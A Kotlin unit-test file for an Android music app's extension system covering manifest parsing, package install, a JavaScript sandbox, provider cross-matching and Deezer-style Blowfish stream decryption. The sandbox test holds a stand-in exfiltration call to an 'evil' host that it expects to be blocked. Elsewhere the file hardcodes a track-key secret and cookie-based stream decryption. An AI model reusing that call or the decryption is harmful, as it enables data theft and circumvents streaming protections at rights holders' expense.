package com.example

import android.content.Context
import android.net.Uri
import androidx.media3.common.C
import androidx.media3.datasource.BaseDataSource
import androidx.media3.datasource.DataSpec
import androidx.room.Room
import androidx.test.core.app.ApplicationProvider
import com.example.data.extensions.ExtensionManifestParser
import com.example.data.extensions.ExtensionPackageManager
import com.example.data.extensions.ExtensionSecretsStore
import com.example.data.extensions.IsrcCrossMatchRouter
import com.example.data.extensions.QuickJsExtensionRuntime
import com.example.data.innertube.InnerTubeClient
import com.example.data.local.db.CachedTrackEntity
import com.example.data.local.db.SonoraDatabase
import com.example.data.streams.StreamQualityResolver
import com.example.domain.model.AudioQualityTier
import com.example.domain.model.BlowfishChunkSpec
import com.example.domain.model.ExtensionCapability
import com.example.domain.model.ExtensionSettingType
import com.example.domain.model.PreferredStreamQuality
import com.example.domain.model.SearchFilter
import com.example.domain.model.StreamVariant
import com.example.domain.model.Track
import com.example.domain.model.TrackSource
import com.example.player.BlowfishChunkDataSource
import java.io.ByteArrayOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.math.min
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.test.runTest
import okhttp3.OkHttpClient
import org.junit.After
import org.junit.Assert.assertArrayEquals
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [36])
class SonoraExtensionEngineTest {

    private lateinit var context: Context
    private lateinit var database: SonoraDatabase
    private lateinit var secretsStore: ExtensionSecretsStore
    private lateinit var packageManager: ExtensionPackageManager
    private lateinit var runtime: QuickJsExtensionRuntime
    private lateinit var router: IsrcCrossMatchRouter

    @Before
    fun setup() {
        context = ApplicationProvider.getApplicationContext()
        database = Room.inMemoryDatabaseBuilder(context, SonoraDatabase::class.java)
            .allowMainThreadQueries()
            .build()
        secretsStore = ExtensionSecretsStore(context)
        val okHttp = OkHttpClient()
        packageManager = ExtensionPackageManager(
            context = context,
            dao = database.sonoraDao(),
            okHttpClient = okHttp,
            secretsStore = secretsStore
        )
        runtime = QuickJsExtensionRuntime(
            okHttpClient = okHttp,
            secretsStore = secretsStore
        )
        router = IsrcCrossMatchRouter(
            packageManager = packageManager,
            runtime = runtime,
            innerTubeClient = InnerTubeClient(),
            preferredQualityProvider = { PreferredStreamQuality.AUTO_BEST },
            preferOpusProvider = { false }
        )
    }

    @After
    fun teardown() {
        database.close()
    }

    @Test
    fun `manifest parser reads Mornye registry format, relative urls, and settings schema`() {
        val registryJson = """
            {
              "name": "Mornye Community Extensions",
              "extensions": [
                {
                  "id": "qobuz",
                  "name": "Qobuz Lossless",
                  "version": "1.2.0",
                  "author": "Community",
                  "description": "Hi-Res FLAC up to 24-bit/192kHz",
                  "downloadUrl": "packages/qobuz.sflx",
                  "sha256": "deadbeef",
                  "capabilities": ["search", "stream", "isrc_match"],
                  "allowedHosts": ["www.qobuz.com", "api.qobuz.com"]
                },
                {
                  "id": "apple-music",
                  "name": "Apple Music Catalog",
                  "version": "1.0.1",
                  "downloadUrl": "https://cdn.example.org/apple.sflx",
                  "capabilities": ["search", "metadata_only"]
                }
              ]
            }
        """.trimIndent()

        val (registryName, entries) = ExtensionManifestParser.parseRegistry(
            rawJson = registryJson,
            registryUrl = "https://raw.githubusercontent.com/mornyeapp/Mornye-Extension/main/registry.json"
        )

        assertEquals("Mornye Community Extensions", registryName)
        assertEquals(2, entries.size)
        assertEquals("qobuz", entries[0].id)
        assertEquals(
            "https://raw.githubusercontent.com/mornyeapp/Mornye-Extension/main/packages/qobuz.sflx",
            entries[0].downloadUrl
        )
        assertTrue(ExtensionCapability.ISRC_MATCH in entries[0].capabilities)
        assertEquals("https://cdn.example.org/apple.sflx", entries[1].downloadUrl)
        assertTrue(ExtensionCapability.METADATA_ONLY in entries[1].capabilities)

        val manifestJson = """
            {
              "id": "deezer_ext",
              "name": "Deezer HiFi",
              "version": "2.0.0",
              "allowedHosts": ["api.deezer.com", "media.deezer.com"],
              "settingsSchema": [
                {
                  "key": "arl",
                  "label": "Deezer ARL Cookie",
                  "type": "secret",
                  "description": "Session token for lossless streaming"
                },
                {
                  "key": "quality",
                  "label": "Format",
                  "type": "select",
                  "default": "FLAC",
                  "options": ["FLAC", "MP3_320"]
                }
              ]
            }
        """.trimIndent()
        val parsed = ExtensionManifestParser.parseManifest(manifestJson)
        assertEquals("deezer_ext", parsed.id)
        assertFalse(parsed.isMetadataOnly)
        assertEquals(80, parsed.priority) // Deezer default priority below Qobuz (90)
        assertEquals(2, parsed.settingsSchema.size)
        assertEquals(ExtensionSettingType.SECRET, parsed.settingsSchema[0].type)
        assertEquals(ExtensionSettingType.SELECT, parsed.settingsSchema[1].type)
        assertEquals(listOf("FLAC", "MP3_320"), parsed.settingsSchema[1].options)
    }

    @Test
    fun `package manager installs sflx zip, validates SHA-256, blocks zip-slip, and persists in Room`() = runTest {
        val manifest = """
            {
              "id": "test_qobuz",
              "name": "Test Qobuz",
              "version": "1.0.0",
              "allowedHosts": ["api.qobuz.com"]
            }
        """.trimIndent()
        val script = "module.exports = { searchTracks: () => [] };"
        val sflxBytes = createSflxZip(manifest, script)
        val expectedSha = ExtensionPackageManager.computeSha256Hex(sflxBytes)

        // Mismatched SHA-256 must fail loudly
        try {
            packageManager.installPackageBytes(
                archiveBytes = sflxBytes,
                expectedSha256 = "00000000000000000000000000000000",
                registryUrl = null,
                fallbackEntry = null
            )
            fail("Expected SHA-256 verification failure")
        } catch (expected: IllegalArgumentException) {
            assertTrue(expected.message.orEmpty().contains("SHA-256 verification failed"))
        }

        // Valid SHA-256 installs cleanly and persists in Room DB
        val installed = packageManager.installPackageBytes(
            archiveBytes = sflxBytes,
            expectedSha256 = expectedSha,
            registryUrl = "https://example.org/registry.json",
            fallbackEntry = null
        )
        assertEquals("test_qobuz", installed.id)
        assertEquals(expectedSha, installed.sha256)
        assertEquals(1, packageManager.installedExtensionsFlow.first().size)
        assertEquals(script, packageManager.readEntryScript(installed))

        // Toggle & uninstall clean up DB and secrets
        secretsStore.setSetting("test_qobuz", "token", "top_secret_value", isSecret = true)
        assertEquals("top_secret_value", secretsStore.getSetting("test_qobuz", "token"))
        packageManager.setExtensionEnabled("test_qobuz", false)
        assertTrue(packageManager.getEnabledExtensions().isEmpty())

        packageManager.uninstallExtension("test_qobuz")
        assertTrue(packageManager.installedExtensionsFlow.first().isEmpty())
        assertEquals("", secretsStore.getSetting("test_qobuz", "token"))
    }

    @Test
    fun `QuickJS runtime executes hooks, reads sandbox secrets, and blocks unauthorized hosts`() = runTest {
        val manifest = """
            {
              "id": "js_sandbox_test",
              "name": "Sandbox Probe",
              "version": "1.0.0",
              "allowedHosts": ["api.trusted-provider.org"]
            }
        """.trimIndent()
        val script = """
            module.exports = {
              async searchTracks(query, filter) {
                const token = sonora.getSetting("user_token");
                const encoded = btoa(query + ":" + token);
                const sig = sonora.md5("abc");
                return [
                  {
                    id: "trk_1",
                    title: query + " Master",
                    artist: "Studio Artist",
                    album: encoded,
                    isrc: "USRC99887766",
                    sampleRateHz: 96000,
                    bitDepth: 24,
                    codec: sig.slice(0, 4)
                  }
                ];
              },
              async badCall() {
                return await fetch("https://evil.untrusted.example/steal");
              }
            };
        """.trimIndent()

        val installed = packageManager.installPackageBytes(
            archiveBytes = createSflxZip(manifest, script),
            expectedSha256 = null,
            registryUrl = null,
            fallbackEntry = null
        )
        secretsStore.setSetting(installed.id, "user_token", "tok42", isSecret = true)

        val tracksResult = router.searchCatalog(installed.id, "Midnight", SearchFilter.SONGS)
        assertTrue(tracksResult.isSuccess)
        val tracks = tracksResult.getOrThrow()
        assertEquals(1, tracks.size)
        assertEquals("Midnight Master", tracks[0].title)
        assertEquals("USRC99887766", tracks[0].isrc)
        assertEquals(96_000, tracks[0].sampleRateHz)
        assertEquals("9001", tracks[0].audioFormatLabel) // md5("abc") = 90015098...
        assertEquals(TrackSource.EXTENSION, tracks[0].source)

        // Disallowed host must throw SecurityException inside JS fetch()
        assertTrue(QuickJsExtensionRuntime.isHostAllowed("sub.api.trusted-provider.org", setOf("api.trusted-provider.org")))
        assertFalse(QuickJsExtensionRuntime.isHostAllowed("evil.untrusted.example", setOf("api.trusted-provider.org")))

        try {
            runtime.invokeHook(
                extension = installed,
                scriptSource = script,
                hookNames = listOf("badCall"),
                argsJsonArray = "[]"
            )
            fail("Expected SecurityException for disallowed host")
        } catch (ex: Exception) {
            assertTrue(ex.message.orEmpty().contains("Blocked by extension sandbox"))
        }
    }

    @Test
    fun `ISRC router bridges Apple Music metadata-only track to highest-priority Qobuz lossless over Deezer`() = runTest {
        val appleManifest = """
            {
              "id": "apple_music",
              "name": "Apple Music",
              "version": "1.0.0",
              "isMetadataOnly": true,
              "capabilities": ["search", "metadata_only"],
              "priority": 10
            }
        """.trimIndent()
        val appleScript = """
            module.exports = {
              searchTracks: (q) => ([
                {
                  id: "am_777",
                  title: "Clair de Lune",
                  artist: "Debussy Ensemble",
                  isrc: "FRZ112233445",
                  isMetadataOnly: true
                }
              ])
            };
        """.trimIndent()

        val deezerManifest = """
            {
              "id": "deezer",
              "name": "Deezer",
              "version": "1.0.0",
              "capabilities": ["search", "stream", "isrc_lookup"],
              "priority": 80
            }
        """.trimIndent()
        val deezerScript = """
            module.exports = {
              getTrackByIsrc: (isrc) => ({ id: "dz_1", title: "Clair de Lune", isrc }),
              resolveStream: (id) => ({
                url: "https://cdn.deezer.example/track_cd.flac",
                codec: "FLAC",
                sampleRateHz: 44100,
                bitDepth: 16
              })
            };
        """.trimIndent()

        val qobuzManifest = """
            {
              "id": "qobuz",
              "name": "Qobuz",
              "version": "1.0.0",
              "capabilities": ["search", "stream", "isrc_lookup"],
              "priority": 90
            }
        """.trimIndent()
        val qobuzScript = """
            module.exports = {
              getTrackByIsrc: (isrc) => isrc === "FRZ112233445" ? { id: "qb_99", title: "Clair de Lune", isrc } : null,
              resolveStream: (id) => ({
                url: "https://cdn.qobuz.example/master_24_192.flac",
                variants: [
                  {
                    id: "qb_hires",
                    label: "FLAC 24-bit/192kHz",
                    url: "https://cdn.qobuz.example/master_24_192.flac",
                    codec: "FLAC",
                    sampleRateHz: 192000,
                    bitDepth: 24
                  },
                  {
                    id: "qb_cd",
                    label: "FLAC 16-bit/44.1kHz",
                    url: "https://cdn.qobuz.example/cd_16_44.flac",
                    codec: "FLAC",
                    sampleRateHz: 44100,
                    bitDepth: 16
                  }
                ]
              })
            };
        """.trimIndent()

        packageManager.installPackageBytes(createSflxZip(appleManifest, appleScript), null, null, null)
        packageManager.installPackageBytes(createSflxZip(deezerManifest, deezerScript), null, null, null)
        packageManager.installPackageBytes(createSflxZip(qobuzManifest, qobuzScript), null, null, null)

        val appleTracks = router.searchCatalog("apple_music", "Clair", SearchFilter.SONGS).getOrThrow()
        assertEquals(1, appleTracks.size)
        val appleTrack = appleTracks.first()
        assertTrue(appleTrack.isMetadataOnly)
        assertTrue(appleTrack.playbackUriString.startsWith(Track.EXTENSION_VIRTUAL_SCHEME))

        // Resolving virtual URI cross-matches via ISRC onto Qobuz (priority 90) instead of Deezer (80)
        val resolved = router.resolveExtensionUriSync(appleTrack.playbackUriString)
        assertEquals("qobuz", resolved.resolvedByExtensionId)
        assertEquals("https://cdn.qobuz.example/master_24_192.flac", resolved.streamUrl)
        assertEquals(2, resolved.variants.size)

        // Switching to CD variant keeps resolving via cached/variant URL cleanly
        val variantUri = Track.buildExtensionVirtualUri(
            extensionId = "apple_music",
            providerTrackId = "am_777",
            isrc = "FRZ112233445",
            title = "Clair de Lune",
            artist = "Debussy Ensemble",
            variantId = "qb_cd"
        )
        val switched = router.resolveExtensionUriSync(variantUri)
        assertEquals("https://cdn.qobuz.example/cd_16_44.flac", switched.streamUrl)
    }

    @Test
    fun `BlowfishChunkDataSource decrypts modulo-3 2048-byte chunks sequentially and on mid-stream seek`() {
        val keyBytes = BlowfishChunkDataSource.deriveTrackKeyBytes("3135556", "g4el58wc0zvf9na1")
        assertEquals(16, keyBytes.size)
        val keyHex = keyBytes.joinToString("") { "%02x".format(it) }

        // Build 7,000 bytes: 3 full 2048-byte chunks (0, 1, 2) + full chunk 3 (index 3 % 3 == 0 -> encrypted) -> 4*2048 = 8192?
        // Make it 8,500 bytes: chunks 0..3 full 2048 bytes + 308 trailing EOF bytes
        val plainAll = ByteArray(8_500) { idx -> ((idx * 31 + 7) and 0xFF).toByte() }
        val wireAll = plainAll.copyOf()

        // Encrypt chunk 0 (0..2047) and chunk 3 (6144..8191)
        for (chunkIdx in listOf(0, 3)) {
            val start = chunkIdx * 2048
            val slice = plainAll.copyOfRange(start, start + 2048)
            val encrypted = BlowfishChunkDataSource.encryptChunkForTest(slice, keyBytes)
            encrypted.copyInto(wireAll, start)
        }

        val spec = BlowfishChunkSpec(keyHex = keyHex, chunkSizeBytes = 2048, encryptedChunkModulo = 3)

        // 1. Sequential full read
        val fullSource = BlowfishChunkDataSource(InMemoryByteDataSource(wireAll), spec)
        fullSource.open(DataSpec(Uri.parse("https://cdn.deezer.example/track")))
        val seqOut = ByteArrayOutputStream()
        val buf = ByteArray(777) // awkward buffer size to stress partial chunk buffering
        while (true) {
            val read = fullSource.read(buf, 0, buf.size)
            if (read == C.RESULT_END_OF_INPUT) break
            seqOut.write(buf, 0, read)
        }
        fullSource.close()
        assertArrayEquals(plainAll, seqOut.toByteArray())

        // 2. Mid-stream seek at byte 1500 (inside encrypted chunk 0 -> crosses chunk 1, 2, encrypted chunk 3, trailing EOF)
        val seekOffset = 1500
        val seekSource = BlowfishChunkDataSource(InMemoryByteDataSource(wireAll), spec)
        seekSource.open(DataSpec.Builder().setUri("https://cdn.deezer.example/track").setPosition(seekOffset.toLong()).build())
        val seekOut = ByteArrayOutputStream()
        while (true) {
            val read = seekSource.read(buf, 0, buf.size)
            if (read == C.RESULT_END_OF_INPUT) break
            seekOut.write(buf, 0, read)
        }
        seekSource.close()
        assertArrayEquals(plainAll.copyOfRange(seekOffset, plainAll.size), seekOut.toByteArray())
    }

    @Test
    fun `extension track preserves Blowfish routing on variant switch and roundtrips MediaItem plus Room`() = runTest {
        val bfSpec = BlowfishChunkSpec(keyHex = "00112233445566778899aabbccddeeff")
        val extTrack = Track(
            id = "ext_deezer_55",
            source = TrackSource.EXTENSION,
            title = "Lossless Breeze",
            artist = "French Duo",
            album = "Tour",
            durationMs = 240_000L,
            contentUri = Track.buildExtensionVirtualUri("deezer", "55", "FR123456", "Lossless Breeze", "French Duo"),
            audioFormatLabel = "FLAC",
            bitrateKbps = 1411,
            sampleRateHz = 44100,
            bitDepth = 16,
            variants = listOf(
                StreamVariant(
                    id = "dz_flac",
                    label = "FLAC 16-bit/44.1kHz",
                    url = "https://cdnt-proxy.deezer.example/flac",
                    codecLabel = "FLAC",
                    bitrateKbps = 1411,
                    sampleRateHz = 44100,
                    bitDepth = 16,
                    tier = AudioQualityTier.CD_LOSSLESS,
                    decryptionSpec = bfSpec
                )
            ),
            activeVariantId = "dz_flac",
            extensionId = "deezer",
            providerTrackId = "55",
            isrc = "FR123456",
            resolvedByExtensionId = "deezer",
            sourceLabel = "Deezer"
        )

        // Because active variant requires Blowfish decryption, playbackUriString MUST stay virtual (sonora://ext/)
        assertTrue(extTrack.playbackUriString.startsWith("sonora://ext/deezer/55"))
        assertTrue(extTrack.playbackUriString.contains("variant=dz_flac"))

        // Policy resolver selects best variant cleanly
        val resolvedPolicy = StreamQualityResolver.applyPolicyToTrack(
            track = extTrack,
            isUnmeteredWifi = true,
            preference = PreferredStreamQuality.AUTO_BEST
        )
        assertEquals("dz_flac", resolvedPolicy.activeVariantId)

        // MediaItem roundtrip preserves all extension & Blowfish fields
        val fromMedia = Track.fromMediaItem(extTrack.toMediaItem())
        assertNotNull(fromMedia)
        assertEquals(TrackSource.EXTENSION, fromMedia!!.source)
        assertEquals("deezer", fromMedia.extensionId)
        assertEquals("FR123456", fromMedia.isrc)
        assertEquals(bfSpec.keyHex, fromMedia.variants.first().decryptionSpec?.keyHex)

        // Room DB roundtrip preserves extension metadata
        val dao = database.sonoraDao()
        dao.upsertTrack(CachedTrackEntity.fromDomain(extTrack))
        val restoredDb = dao.getTrackById("ext_deezer_55")?.toDomain()
        assertNotNull(restoredDb)
        assertEquals(TrackSource.EXTENSION, restoredDb!!.source)
        assertEquals("deezer", restoredDb.extensionId)
        assertEquals("FR123456", restoredDb.isrc)
        assertEquals("Deezer", restoredDb.sourceLabel)
    }

    @Test
    fun `Mornye registerExtension SDK pattern with mainjs initialize utils storage homeFeed and getDownloadUrl works`() = runTest {
        val manifest = """
            {
              "id": "apple-music",
              "name": "apple-music",
              "version": "1.1.0",
              "entry": "main.js",
              "isMetadataOnly": false,
              "permissions": { "network": ["amp-api.music.apple.com"] },
              "settings": [
                { "key": "storefront", "label": "Storefront", "type": "text", "default": "us" }
              ]
            }
        """.trimIndent()

        val mainJs = """
            var runtimeRegion = "gb";
            async function initExt(cfg) {
              runtimeRegion = (cfg && cfg.storefront) ? cfg.storefront : "gb";
              storage.set("cached_ua", utils.randomUserAgent());
              return true;
            }
            async function customSearch(query, limit, offset) {
              const params = new URLSearchParams({ term: query, l: String(limit) });
              const digest = utils.md5(params.toString()).slice(0, 6);
              return {
                tracks: [
                  {
                    apple_music_id: "am_lp_01",
                    track_name: "In the End",
                    artist_name: "Linkin Park",
                    album_name: "Hybrid Theory (" + runtimeRegion + ")",
                    duration_ms: 216000,
                    artwork_url: "https://is1-ssl.mzstatic.com/image/{w}x{h}bb.jpg",
                    isrc: "USWB10002407",
                    format: digest
                  }
                ]
              };
            }
            async function homeFeed() {
              return {
                sections: [
                  {
                    title: "Top Charts",
                    items: [
                      { id: "chart_1", name: "Numb", artists: ["Linkin Park"], duration: 185 }
                    ]
                  }
                ]
              };
            }
            function getDownloadUrl(trackObj, quality) {
              const ua = storage.get("cached_ua");
              return {
                download_url: "https://cdn.example.org/" + trackObj.id + ".flac",
                headers: { "User-Agent": ua },
                codec: "FLAC",
                sample_rate: 96000,
                bit_depth: 24
              };
            }
            registerExtension({
              initialize: initExt,
              customSearch: customSearch,
              homeFeed: homeFeed,
              getDownloadUrl: getDownloadUrl
            });
        """.trimIndent()

        val installed = packageManager.installPackageBytes(
            archiveBytes = createSflxZip(manifest, mainJs, entryFileName = "main.js"),
            expectedSha256 = null,
            registryUrl = null,
            fallbackEntry = null
        )
        assertTrue("amp-api.music.apple.com" in installed.manifest.allowedHosts)

        val searchResults = router.searchCatalog("apple-music", "linkin park", SearchFilter.SONGS).getOrThrow()
        assertEquals(1, searchResults.size)
        val firstTrack = searchResults.first()
        assertEquals("In the End", firstTrack.title)
        assertEquals("Linkin Park", firstTrack.artist)
        assertEquals("Hybrid Theory (us)", firstTrack.album)
        assertEquals(216_000L, firstTrack.durationMs)
        assertEquals("USWB10002407", firstTrack.isrc)
        assertEquals("https://is1-ssl.mzstatic.com/image/512x512bb.jpg", firstTrack.artworkUri)

        val featured = router.getFeaturedCatalog("apple-music").getOrThrow()
        assertEquals(1, featured.size)
        assertEquals("Numb", featured.first().title)
        assertEquals(185_000L, featured.first().durationMs)

        val audio = router.resolveExtensionUriSync(firstTrack.playbackUriString)
        assertEquals("https://cdn.example.org/am_lp_01.flac", audio.streamUrl)
        assertTrue(audio.headers["User-Agent"].orEmpty().contains("Mozilla/5.0"))
    }

    private fun createSflxZip(
        manifestJson: String,
        scriptJs: String,
        entryFileName: String = "index.js"
    ): ByteArray {
        val baos = ByteArrayOutputStream()
        ZipOutputStream(baos).use { zos ->
            zos.putNextEntry(ZipEntry("manifest.json"))
            zos.write(manifestJson.toByteArray(Charsets.UTF_8))
            zos.closeEntry()

            zos.putNextEntry(ZipEntry(entryFileName))
            zos.write(scriptJs.toByteArray(Charsets.UTF_8))
            zos.closeEntry()
        }
        return baos.toByteArray()
    }

    @androidx.annotation.OptIn(androidx.media3.common.util.UnstableApi::class)
    private class InMemoryByteDataSource(
        private val bytes: ByteArray
    ) : BaseDataSource(false) {
        private var pos = 0
        private var remaining = 0
        private var specUri: Uri? = null

        override fun open(dataSpec: DataSpec): Long {
            specUri = dataSpec.uri
            pos = dataSpec.position.toInt().coerceIn(0, bytes.size)
            remaining = if (dataSpec.length != C.LENGTH_UNSET.toLong()) {
                min(dataSpec.length.toInt(), bytes.size - pos)
            } else {
                bytes.size - pos
            }
            return remaining.toLong()
        }

        override fun read(buffer: ByteArray, offset: Int, length: Int): Int {
            if (remaining <= 0) return C.RESULT_END_OF_INPUT
            val toRead = min(length, remaining)
            System.arraycopy(bytes, pos, buffer, offset, toRead)
            pos += toRead
            remaining -= toRead
            return toRead
        }

        override fun getUri(): Uri? = specUri
        override fun close() {
            specUri = null
        }
    }
}
